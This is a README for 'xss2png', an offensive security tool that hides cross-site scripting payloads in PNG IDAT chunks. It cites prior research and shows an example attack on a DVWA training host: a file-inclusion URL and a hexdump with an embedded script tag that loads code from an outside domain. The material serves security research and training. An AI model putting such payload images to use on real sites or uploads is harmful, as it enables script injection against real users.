# xss2png
PNG IDAT chunks XSS payload generator


### Credits

fin1te  
Adam Logue  
huntergregal  
IDontPlayDarts  
Masato Kinugawa  
Nathaniel McHugh

### Relevant posts

06-2012 [Encoding Web Shells in PNG IDAT chunks](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

11-2015 [Bug-hunter's Sorrow](https://www.slideshare.net/masatokinugawa/avtokyo-bug-hunters-sorrow-en)

01-2016 [An XSS on Facebook via PNGs & Wonky Content Types](https://whitton.io/articles/xss-on-facebook-via-png-content-types/)

03-2016 [Revisiting XSS payloads in PNG IDAT chunks](https://www.adamlogue.com/revisiting-xss-payloads-in-png-idat-chunks/)

### Other tools

[PNG-IDAT-chunks](https://github.com/vavkamil/old-repos-backup/tree/master/PNG-IDAT-chunks-master)

[PNG-IDAT-Payload-Generator](https://github.com/huntergregal/PNG-IDAT-Payload-Generator)

### Stack Overflow

[PHP shell on PNG's IDAT Chunk](https://stackoverflow.com/questions/49144776/php-shell-on-pngs-idat-chunk)

### Example

`https://dvwa.capturetheflag.cz/vulnerabilities/fi/?page=../../hackable/uploads/xss.png`

```
vavkamil@localhost:~/Documents/Python/xss2png$ hexdump -c xss.png 
0000000 211   P   N   G  \r  \n 032  \n  \0  \0  \0  \r   I   H   D   R
0000010  \0  \0  \0      \0  \0  \0      \b 002  \0  \0  \0   � 030   �
0000020   �  \0  \0  \0   y   I   D   A   T   x 234   c   �   <   S   C
0000030   R   I   P   T       S   R   C   =   \   \   X   S   S   .   V
0000040   A   V   K   A   M   I   L   .   C   Z   >   <   /   S   C   R
0000050   I   P   T   >       �   �   � 031   �   �   �   =   s   3   �
0000060 025   �   K   � 217 017   _   s   �   �   �   �   �   �   ?   �
0000070 227   _   �   X   1   �   �  \t   �   �   ~   �   �   �   g   o
0000080   4   �   �   v   �   3   2   2 214 202   Q   0  \n   F   �   (
0000090 030 005   �   ` 024 214 202   Q   0  \n 206 034  \0  \0   4   �
00000a0   % 002 021   �   �   �  \0  \0  \0  \0   I   E   N   D   �   B
00000b0   ` 202                                                        
00000b2
````
